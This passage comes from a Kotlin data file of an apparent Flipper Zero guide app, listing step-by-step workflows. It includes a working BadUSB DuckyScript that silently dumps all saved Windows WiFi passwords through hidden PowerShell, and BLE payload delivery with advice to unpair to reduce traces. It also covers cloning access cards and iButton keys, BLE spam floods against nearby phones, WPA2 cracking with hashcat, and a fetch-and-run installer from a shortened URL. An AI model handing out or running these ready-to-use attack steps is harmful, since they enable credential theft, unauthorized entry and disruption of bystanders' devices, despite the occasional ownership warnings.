                    title = "Re-Read with Expanded Dictionary",
                    description = "NFC > Read again. Now Flipper tries your expanded dictionary. Should get full sector dump.",
                    tips = listOf("If still partial: repeat Detect Reader with different reader or sector")
                ),
                WorkflowStep(
                    stepNumber = 8,
                    title = "Emulate Card",
                    description = "NFC > Saved > select card > Emulate. Flipper acts as that card at readers.",
                    commands = listOf(
                        Command("Emulate", "NFC > Saved > [name] > Emulate", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 9,
                    title = "Clone to Magic Card",
                    description = "NFC > Saved > select card > Write. Hold Magic Gen1a card against Flipper.",
                    tips = listOf(
                        "Magic card: purchase 'UID changeable MIFARE Classic' cards",
                        "Gen1a cards work with most cloners",
                        "Gen2 cards work with more strict readers but need different method"
                    )
                )
            )
        ),

        Workflow(
            id = "nfc_ntag",
            title = "Read & Write NTAG Tags",
            subtitle = "Clone NFC stickers, Amiibo figures, and NTAG213/215/216 tags",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Blank NTAG215 sticker (for Amiibo cloning)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read NTAG Tag",
                    description = "NFC > Read. Flipper auto-detects NTAG213/215/216.",
                    commands = listOf(
                        Command("Read", "NFC > Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "NTAG shows all pages/bytes — no encryption",
                        "Common uses: NFC stickers, business cards, toy figures (Amiibo)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Save and Emulate",
                    description = "Save tag, then Emulate to use as that tag.",
                    commands = listOf(
                        Command("Emulate", "NFC > Saved > [name] > Emulate", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Write to Blank NTAG",
                    description = "NFC > Saved > Write. Use blank NTAG stickers.",
                    tips = listOf(
                        "Amiibo cloning: save Amiibo tag, write to blank NTAG215",
                        "Important: NTAG215 for Amiibo (capacity match)"
                    )
                )
            )
        ),

        Workflow(
            id = "nfc_emv",
            title = "Read EMV Bank Card Data",
            subtitle = "Read contactless payment card data via NFC",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Contactless bank card"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read Bank Card",
                    description = "NFC > Read. Hold bank card against Flipper back.",
                    commands = listOf(
                        Command("Read", "NFC > Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Flipper reads: masked card number, expiry date, recent transactions",
                        "CANNOT clone — cryptographic challenge-response prevents fraud"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "View Transaction Log",
                    description = "Saved data shows card number (last 4 digits shown), expiry, some transaction amounts",
                    warning = "Reading someone else's card without permission is illegal",
                    tips = listOf(
                        "For own cards only: useful to verify contactless data exposure",
                        "Modern cards: limited data exposed via NFC"
                    )
                )
            )
        ),

        Workflow(
            id = "badusb_basic",
            title = "Run BadUSB Payload via USB",
            subtitle = "Execute a DuckyScript keyboard injection payload via USB",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "USB-C to USB-A cable", "DuckyScript .txt payload"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Create or Download Payload",
                    description = "Create a DuckyScript .txt payload file or download from community.",
                    tips = listOf(
                        "Save as .txt file",
                        "GitHub: I-Am-Jakoby/Flipper-Zero-BadUSB — comprehensive payloads",
                        "GitHub: Zarcolio/flipperzero — Windows/Linux payloads",
                        "GitHub: narstybits/MacOS-DuckyScripts — 100+ macOS payloads"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Upload Payload to Flipper",
                    description = "Connect Flipper via USB. Copy .txt payload to /ext/badusb/ on SD card.",
                    commands = listOf(
                        Command("Copy path", "/ext/badusb/your_payload.txt", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Select Payload",
                    description = "Flipper: Bad USB > select your payload file.",
                    commands = listOf(
                        Command("Navigate", "Main Menu > Bad USB > [your_payload.txt]", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Connect to Target Computer",
                    description = "Connect Flipper to target computer via USB-C to USB-A cable.",
                    warning = "Only perform on computers you own",
                    tips = listOf(
                        "Flipper auto-recognized as HID keyboard — no drivers needed",
                        "Works on Windows, macOS, Linux, Android"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Execute Payload",
                    description = "Press OK on Flipper to execute payload. Watch execution.",
                    tips = listOf(
                        "DELAY 1000 at start allows computer to recognize device",
                        "GUI r = Windows key + R = Run dialog"
                    )
                )
            )
        ),

        Workflow(
            id = "badusb_wifi_grab",
            title = "WiFi Password Grabber (Windows)",
            subtitle = "Extract all saved WiFi passwords from a Windows PC via BadUSB",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "USB cable", "Windows target PC"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Create WiFi Grabber Payload",
                    description = "Create this DuckyScript payload:",
                    commands = listOf(
                        Command(
                            "WiFi grabber payload",
                            "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"(netsh wlan show profiles) | Select-String 'All User Profile' | %{\$n=(\$_ -split ':')[1].Trim(); (netsh wlan show profile name=\$n key=clear)} | Select-String 'Key Content' | Out-File \$env:USERPROFILE\\Desktop\\wifi_passwords.txt\"\nENTER",
                            Device.PC
                        )
                    ),
                    tips = listOf("This dumps all saved WiFi passwords to Desktop/wifi_passwords.txt")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Upload and Execute",
                    description = "Upload to /ext/badusb/ and execute on Windows target.",
                    tips = listOf(
                        "File appears on Desktop automatically",
                        "Hidden PowerShell window — subtle execution"
                    )
                )
            )
        ),

        Workflow(
            id = "badusb_ble",
            title = "Run BadUSB Wirelessly via BLE",
            subtitle = "Execute HID keyboard payloads over Bluetooth without a cable",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Bluetooth", "Target computer with Bluetooth"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Enable Bluetooth on Flipper",
                    description = "Settings > Bluetooth > Bluetooth > ON",
                    commands = listOf(
                        Command("Enable BT", "Settings > Bluetooth > Bluetooth > ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Load Payload in BLE Mode",
                    description = "Bad USB > select payload > 'Connect via BT' (instead of USB)",
                    commands = listOf(
                        Command("BLE mode", "Bad USB > [payload] > Connect via BT", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Pair with Target",
                    description = "Target computer shows Flipper as Bluetooth keyboard. Pair it.",
                    tips = listOf(
                        "No USB cable needed",
                        "Range: ~10 meters",
                        "Works through walls at close range"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Execute Payload",
                    description = "Press OK on Flipper. Payload executes on target computer wirelessly.",
                    tips = listOf(
                        "Flipper appears as 'Flipper Keyboard' in BT devices",
                        "Can unpair after execution to reduce traces"
                    )
                )
            )
        ),

        Workflow(
            id = "ble_spam",
            title = "BLE Spam — Notification Flood",
            subtitle = "Flood nearby iOS, Android, and Windows devices with BLE popups",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
            prerequisites = listOf("Flipper Zero with Momentum firmware OR AWOK with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Launch BLE Spam on Flipper",
                    description = "Apps > Bluetooth > BLE Spam",
                    commands = listOf(
                        Command("Navigate", "Apps > Bluetooth > BLE Spam", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Requires Momentum or Unleashed firmware",
                        "Not in official firmware"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select Target Device Type",
                    description = "Choose target:",
                    tips = listOf(
                        "iOS: AirDrop spam, AirPods spam, Apple Watch pairing",
                        "Android: Google Fast Pair (fake earbuds), Samsung Galaxy devices",
                        "Windows: Nearby Share notification spam"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run Spam Attack",
                    description = "Select attack type and press OK. Flipper floods area with BLE advertisements.",
                    warning = "Can drain nearby device batteries and cause annoyance",
                    tips = listOf(
                        "iOS devices show popup notifications repeatedly",
                        "Android shows 'New device found' repeatedly"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "AWOK BLE Spam Alternative",
                    description = "Alternatively via AWOK Marauder:",
                    commands = listOf(
                        Command("BLE spam", "blespam", Device.MARAUDER)
                    ),
                    tips = listOf("AWOK has higher BLE output power than Flipper")
                )
            )
        ),

        Workflow(
            id = "bt_scan",
            title = "Bluetooth Device Scanning",
            subtitle = "Enumerate nearby Bluetooth Classic and BLE devices",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
            prerequisites = listOf("AWOK with Marauder for BT Classic", "Flipper Zero for BLE scan"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan Bluetooth Classic via AWOK",
                    description = "Run Bluetooth sniffing on AWOK Marauder.",
                    commands = listOf(
                        Command("BT sniff", "sniffbt", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Shows nearby Bluetooth Classic devices (non-BLE)",
                        "PCAP saved for offline analysis"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "BLE Scan via Flipper",
                    description = "On Flipper: Settings > Bluetooth > 'Scan'. Shows all BLE advertising devices with name, MAC, RSSI.",
                    tips = listOf(
                        "Identifies: AirTags (Apple), Tile trackers, Galaxy SmartTags, smart locks",
                        "Shows exact manufacturer from BLE advertisement data"
                    )
                )
            )
        ),

        Workflow(
            id = "ir_learn",
            title = "Learn & Replay IR Remote",
            subtitle = "Teach Flipper any infrared remote and replay signals",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target IR remote"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Infrared",
                    description = "Navigate to the Infrared module.",
                    commands = listOf(
                        Command("Navigate", "Main Menu > Infrared", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Learning Remote",
                    description = "Infrared > Learn New Remote. Name it (e.g., 'LivingRoom_TV').",
                    commands = listOf(
                        Command("Learn", "Infrared > Learn New Remote", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Capture Each Button",
                    description = "Flipper shows 'Point remote and press button'. Press each remote button once.",
                    tips = listOf(
                        "Flipper captures IR signal and auto-identifies carrier frequency",
                        "Add all buttons: Power, Vol+/-, Mute, Input, Menu, etc.",
                        "LED blinks when signal captured successfully"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Save Remote",
                    description = "Press Back when done. Remote saved with all learned buttons.",
                    tips = listOf("Save multiple remotes: TV, AC, projector, soundbar")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Replay Button",
                    description = "Infrared > Saved Remotes > select remote > select button > Send.",
                    commands = listOf(
                        Command("Send", "Infrared > Saved Remotes > [name] > [button] > Send", Device.FLIPPER_CLI)
                    )
                )
            )
        ),

        Workflow(
            id = "ir_universal",
            title = "Universal IR Remote (All Brands)",
            subtitle = "Control any TV or device using Flipper's built-in universal remote",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Universal Remotes",
                    description = "Navigate to Universal Remotes section.",
                    commands = listOf(
                        Command("Navigate", "Infrared > Universal Remotes", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select Device Type",
                    description = "Choose: TV, Audio/Amplifier, Air Conditioner, Fan, Projector",
                    tips = listOf(
                        "TV database includes: Samsung, LG, Sony, Philips, Panasonic, Vizio, TCL, Hisense, and 200+ more brands"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Power Brute Force",
                    description = "Select 'Power Brute' to cycle through all power codes. Works even if you don't know the brand.",
                    tips = listOf(
                        "Cycles through all known TV power codes",
                        "TV will turn on/off when matching code sent",
                        "Works on >95% of TVs"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Volume Control",
                    description = "After finding working brand, select Vol+/- for volume control.",
                    tips = listOf("If brand not found: try 'Next' after each attempt")
                )
            )
        ),

        Workflow(
            id = "ir_brute",
            title = "IR Brute Force Unknown Device",
            subtitle = "Capture and analyze IR signals from unknown equipment",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Unknown IR device"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Capture RAW IR Signal",
                    description = "Infrared > Learn New Remote. Hold Flipper near unknown IR device while it sends a signal.",
                    tips = listOf(
                        "Works for any IR device: medical equipment, industrial controls, security panels"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Analyze RAW Signal",
                    description = "RAW signals can be analyzed to find protocol.",
                    tips = listOf(
                        "Common IR protocols: NEC, Sony SIRC, RC5, RC6, Samsung",
                        "Use IR scope app for detailed waveform analysis"
                    )
                )
            )
        ),

        Workflow(
            id = "ibutton_read",
            title = "Read & Clone Dallas iButton Key",
            subtitle = "Clone Dallas DS1990A iButton keys used in intercoms and access systems",
            categoryId = "ibutton",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target iButton key", "Blank DS1990A iButton (for clone)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open iButton",
                    description = "Navigate to the iButton module on Flipper.",
                    commands = listOf(
                        Command("Navigate", "Main Menu > iButton", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read iButton Key",
                    description = "iButton > Read. Touch iButton key to Flipper's TM connector (bottom-left metal contact).",
                    commands = listOf(
                        Command("Read", "iButton > Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "TM connector = bottom left of Flipper (small metal square)",
                        "iButton must make solid contact",
                        "DS1990A (most common): reads in 1 second",
                        "Cyfral/Metakom (intercom): also supported"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Save Key",
                    description = "Press OK. Name the key (e.g., 'Apartment_Main_Door')."
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Emulate Key",
                    description = "iButton > Saved > select key > Emulate. Touch Flipper connector to reader.",
                    commands = listOf(
                        Command("Emulate", "iButton > Saved > [name] > Emulate", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Hold Flipper connector to reader contact pad firmly",
                        "Works on most Dallas key readers"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Clone to Blank iButton",
                    description = "iButton > Saved > select key > Write > touch blank iButton to connector.",
                    tips = listOf(
                        "Blank iButtons: 'blank DS1990A iButton' on Amazon",
                        "Clone creates physical copy of key"
                    )
                )
            )
        ),

        Workflow(
            id = "gpio_uart",
            title = "GPIO UART Serial Bridge",
            subtitle = "Use Flipper as a UART serial bridge to access embedded device consoles",
            categoryId = "gpio",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target device with UART pins exposed", "Jumper wires"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open USB-UART Bridge App",
                    description = "Navigate to the GPIO UART bridge application.",
                    commands = listOf(
                        Command("Navigate", "Apps > GPIO > USB-UART Bridge", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Wire UART Connections",
                    description = "Connect target device UART pins to Flipper GPIO:",
                    commands = listOf(
                        Command("TX/RX wiring", "Target TX → Flipper RX (pin 14)\nTarget RX → Flipper TX (pin 13)\nTarget GND → Flipper GND", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "3.3V logic levels — do NOT connect 5V signals directly",
                        "Some devices: target 5V TX → voltage divider → Flipper RX"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Connect Flipper to Android",
                    description = "Connect Flipper to Android via USB-C OTG cable. Opens virtual serial port.",
                    tips = listOf(
                        "Flipper presents as USB Serial device",
                        "Use Serial Terminal app on Android (e.g., Serial USB Terminal)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Set Baud Rate",
                    description = "Match baud rate to target device in GPIO app. Common rates: 9600, 115200, 57600.",
                    commands = listOf(
                        Command("Common baud", "115200, 9600, 57600, 38400", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Interact with Serial Console",
                    description = "Type commands to target device's serial console. Useful for: router serial console, Arduino debug, embedded system access.",
                    tips = listOf(
                        "Hold CTRL+C or send break to interrupt boot and access shell on some routers",
                        "Many routers expose root shell via UART during boot"
                    )
                )
            )
        ),

        Workflow(
            id = "gpio_power",
            title = "Power External Devices via GPIO",
            subtitle = "Use Flipper GPIO pins to supply 3.3V or 5V to external hardware",
            categoryId = "gpio",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "External device needing power"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "3.3V Power Supply",
                    description = "Flipper GPIO pin 9 = 3.3V, 50mA max. Good for: sensors, small MCUs.",
                    commands = listOf(
                        Command("Enable power", "power 3v3 1", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "5V Power Supply",
                    description = "Flipper GPIO pin 1 = 5V (from USB). Must be connected to USB power.",
                    commands = listOf(
                        Command("Enable 5V", "power 5v 1", Device.FLIPPER_CLI),
                        Command("Disable 5V", "power 5v 0", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "5V pin only active when Flipper connected to USB",
                        "Can power AWOK or small sensors"
                    )
                )
            )
        ),

        Workflow(
            id = "rpc_connect",
            title = "Connect to Flipper via BLE RPC",
            subtitle = "Control Flipper Zero programmatically via Bluetooth protobuf RPC",
            categoryId = "connect",
            hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("Flipper Zero with Bluetooth enabled", "FlipperGuide app"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Enable Bluetooth on Flipper",
                    description = "Turn on Bluetooth in Flipper settings.",
                    commands = listOf(
                        Command("Enable BT", "Settings > Bluetooth > Bluetooth > ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Scan in FlipperGuide",
                    description = "Open FlipperGuide app > Flipper RPC > tap 'Scan'. App finds Flipper BLE advertisement.",
                    tips = listOf(
                        "Flipper BLE name: 'Flipper [device_name]'",
                        "Service UUID: 19ED82AE-ED21-4C9D-4145-228E62FE0000"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Connect to Flipper",
                    description = "Tap your Flipper in the scan list. App connects via GATT and establishes RPC channel.",
                    tips = listOf(
                        "BLE GATT connection uses protobuf message framing",
                        "Same protocol as official mobile app"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Available RPC Commands",
                    description = "Once connected, available RPC operations:",
                    commands = listOf(
                        Command("Ping", "system_ping", Device.FLIPPER_CLI),
                        Command("Device info", "system_device_info_request", Device.FLIPPER_CLI),
                        Command("Reboot", "system_reboot_request", Device.FLIPPER_CLI),
                        Command("List storage", "storage_list_request /ext", Device.FLIPPER_CLI),
                        Command("Start app", "app_start_request [app_name]", Device.FLIPPER_CLI)
                    )
                )
            )
        ),

        Workflow(
            id = "tools_nethunter",
            title = "Install Kali NetHunter in Termux",
            subtitle = "Set up a full Kali Linux environment on Android without root",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Android phone", "Termux from F-Droid", "8GB free storage", "WiFi connection"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install Termux from F-Droid",
                    description = "Download and install Termux from F-Droid (NOT Google Play — Play version is outdated).",
                    tips = listOf(
                        "F-Droid: https://f-droid.org",
                        "Search 'Termux' in F-Droid and install"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Setup Storage Access",
                    description = "Run in Termux:",
                    commands = listOf(
                        Command("Setup storage", "termux-setup-storage", Device.TERMUX)
                    ),
                    tips = listOf("Grants /sdcard access — required for PCAP transfer")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Update Termux Packages",
                    description = "Update all packages before installing NetHunter.",
                    commands = listOf(
                        Command("Update", "pkg update && pkg upgrade -y", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Install Kali NetHunter",
                    description = "Download and run the NetHunter rootless installer:",
                    commands = listOf(
                        Command("Install NetHunter", "pkg install wget curl -y && wget -O install-nethunter-termux https://offs.ec/2MceZWr && bash install-nethunter-termux", Device.TERMUX)
                    ),
                    tips = listOf(
                        "~8GB download — use WiFi",
                        "Takes 15-30 minutes",
                        "Select 'full' installation for all tools"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Launch Kali Environment",
                    description = "Start the Kali NetHunter chroot environment.",
                    commands = listOf(
                        Command("Launch Kali", "nethunter", Device.TERMUX),
                        Command("Launch as root", "nethunter -r", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Verify Tool Installation",
                    description = "Confirm key security tools are available.",
                    commands = listOf(
                        Command("Check nmap", "nmap --version", Device.TERMUX),
                        Command("Check hashcat", "hashcat --version", Device.TERMUX)
                    )
                )
            )
        ),

        Workflow(
            id = "tools_hashcat",
            title = "Crack WiFi Password with Hashcat",
            subtitle = "Use hashcat in Termux to crack captured WPA2 handshakes",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux installed", "Captured .pcap file from Marauder", "Wordlist"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install Hashcat",
                    description = "Install hashcat via Termux package manager.",
                    commands = listOf(
                        Command("Install", "pkg install hashcat -y", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Download Wordlist",
                    description = "Download rockyou.txt or other wordlist:",
                    commands = listOf(
                        Command("Download rockyou", "wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
                    ),
                    tips = listOf(
                        "rockyou.txt: 14 million common passwords",
                        "SecLists has specialized WiFi wordlists"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Transfer PCAP File",
                    description = "Copy PCAP from Flipper SD card (/apps_data/marauder/pcaps/) to phone Downloads via USB."
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Convert PCAP to Hashcat Format",
                    description = "Convert to hashcat format:",
                    commands = listOf(
                        Command("Online convert", "https://hashcat.net/cap2hashcat/ — upload .pcap", Device.ANDROID),
                        Command("If hcxtools available", "hcxpcapngtool -o out.hc22000 capture.pcap", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Run Hashcat Attack",
                    description = "Attack the captured hash with various modes.",
                    commands = listOf(
                        Command("Dictionary", "hashcat -m 22000 out.hc22000 ~/rockyou.txt", Device.TERMUX),
                        Command("8-digit PIN", "hashcat -m 22000 out.hc22000 -a 3 ?d?d?d?d?d?d?d?d", Device.TERMUX),
                        Command("8-char alpha", "hashcat -m 22000 out.hc22000 -a 3 ?l?l?l?l?l?l?l?l", Device.TERMUX),
                        Command("Show result", "hashcat -m 22000 out.hc22000 --show", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Advanced Attack Modes",
                    description = "Use rules and hybrid masks for better coverage.",
                    tips = listOf(
                        "Rules: hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                        "Mask attack variations: ?u?l?l?l?l?l?d?d (First cap, 6 lower, 2 digits)"
                    )
                )
            )
        ),

        Workflow(
            id = "tools_termux_setup",
            title = "Essential Termux Package Setup",
            subtitle = "Install core security tools in Termux for Android pentesting",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux from F-Droid", "Internet connection"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install Core Packages",
                    description = "Install essential security tools in one command.",
                    commands = listOf(
                        Command("Install all", "pkg install nmap python curl wget python-pip tshark aircrack-ng -y", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install Python Libraries",
                    description = "Install Python security libraries via pip.",
                    commands = listOf(
                        Command("Install scapy", "pip install scapy requests", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Verify nmap Works",
                    description = "Test nmap with a connect scan (works without root).",
                    commands = listOf(
                        Command("Network scan", "nmap -sT -sV 192.168.1.0/24", Device.TERMUX)
                    ),
                    tips = listOf(
                        "Use -sT (connect scan) NOT -sS (SYN scan requires root)",
                        "Non-rooted device: -sT, -sV, -sn all work"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Read PCAP Files Without Root",
                    description = "tshark can read existing capture files without root privileges.",
                    commands = listOf(
                        Command("Read pcap", "tshark -r capture.pcap", Device.TERMUX)
                    ),
                    tips = listOf(
                        "tshark can READ pcap files without root",
                        "Cannot CAPTURE live traffic without root"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "View Active Network Connections",
                    description = "Check active connections using tools that work without root.",
                    commands = listOf(
                        Command("Show connections", "ss -tulpn", Device.TERMUX),
                        Command("Netstat", "netstat -an", Device.TERMUX)
                    )
                )
            )
        )
    )

    fun getCategories(): List<Category> {
        val countMap = allWorkflows.groupBy { it.categoryId }.mapValues { it.value.size }
        return listOf(
            Category(
                id = "setup",
                title = "Setup & Firmware",
                icon = "ic_settings",
                description = "Install firmware, flash AWOK, pair devices",
                workflowCount = countMap["setup"] ?: 0
            ),
            Category(
                id = "wifi",
                title = "WiFi Attacks",
                icon = "ic_wifi",
                description = "Scan, deauth, capture handshakes, evil portal",
                workflowCount = countMap["wifi"] ?: 0
            ),
            Category(
                id = "subghz",
                title = "Sub-GHz",
                icon = "ic_radio",
                description = "Read/replay remotes, brute force garage doors",
                workflowCount = countMap["subghz"] ?: 0
            ),
            Category(
                id = "rfid",
                title = "RFID 125kHz",
                icon = "ic_rfid",
                description = "Clone access cards and key fobs",
                workflowCount = countMap["rfid"] ?: 0
            ),
            Category(
                id = "nfc",
                title = "NFC 13.56MHz",
                icon = "ic_nfc",
                description = "MIFARE Classic attacks, card cloning",
                workflowCount = countMap["nfc"] ?: 0
            ),
            Category(
                id = "badusb",
                title = "BadUSB",
                icon = "ic_usb",
                description = "HID keyboard attacks via USB or Bluetooth",
                workflowCount = countMap["badusb"] ?: 0
            ),
            Category(
                id = "bluetooth",
                title = "Bluetooth & BLE",
                icon = "ic_bluetooth",
                description = "BLE spam, scanning, device enumeration",
                workflowCount = countMap["bluetooth"] ?: 0
            ),
            Category(
                id = "infrared",
                title = "Infrared",
                icon = "ic_ir",
                description = "Universal remote, learn and replay signals",
                workflowCount = countMap["infrared"] ?: 0
            ),
            Category(
                id = "ibutton",
                title = "iButton",
                icon = "ic_key",
                description = "Dallas key cloning for intercoms and access",
                workflowCount = countMap["ibutton"] ?: 0
            ),
            Category(
                id = "gpio",
                title = "GPIO & Hardware",
                icon = "ic_gpio",
                description = "Hardware hacking, UART bridge, serial tools",
                workflowCount = countMap["gpio"] ?: 0
            ),
            Category(
                id = "connect",
                title = "Flipper RPC",
                icon = "ic_link",
                description = "Direct Bluetooth control via protobuf RPC",
                workflowCount = countMap["connect"] ?: 0
            ),
            Category(
                id = "tools",
                title = "OS & Tools",
                icon = "ic_terminal",
                description = "Kali NetHunter, hashcat, Termux setup",
                workflowCount = countMap["tools"] ?: 0
            )
        )
    }

    fun getWorkflowsByCategory(categoryId: String): List<Workflow> =
        allWorkflows.filter { it.categoryId == categoryId }

    fun getWorkflowById(id: String): Workflow? =
        allWorkflows.firstOrNull { it.id == id }
}
